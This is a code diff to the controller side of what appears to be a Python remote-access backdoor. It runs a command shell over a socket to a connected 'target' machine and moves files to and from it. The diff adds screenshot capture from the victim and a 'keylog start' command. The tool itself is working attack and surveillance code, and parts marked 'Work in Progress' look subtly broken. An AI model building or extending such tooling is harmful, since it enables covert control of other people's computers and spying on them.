@@ -8,6 +8,8 @@ import json
 import os
 import base64
 
+count = 1
+
 def reliable_send(data):
     jsonData = json.dumps(data)
     target.send(jsonData.encode())
@@ -22,17 +24,21 @@ def reliable_recv():
             continue
 
 def shell():
+    global count
     while True:
         command = input("Shell#~%s: " % str(ip))
         reliable_send(command)
         if command == 'exit':
             break
+
         elif command[:2] == "cd" and len(command) > 1:
             continue
+
         elif command[:8] == "download":
             with open(command[9:], "wb") as download:
                 fileData = reliable_recv()
                 download.write(base64.b64decode(fileData))
+
         elif command[:6] == "upload": #Work in Progress
             with open(command[7:], "rb") as upload:
                 try:
@@ -41,6 +47,20 @@ def shell():
                     failed = '[-] Failed to Upload'
                     print(colored(failed, "red"))
                     reliable_send(base64.b64encode(failed))
+
+        elif command[:10] == "screenshot": #Work in Progress
+            with open("screenshot%d" % count, "wb") as sc:
+                image = reliable_recv()
+                imageDecode = base64.b64decode(image)
+                if imageDecode[:3] == "[-]":
+                    print(image)
+                else:
+                    sc.write(image)
+                    count += 1
+
+        elif command[:12] == "keylog start":
+            continue
+
         else:
             result = reliable_recv()
             print(result)
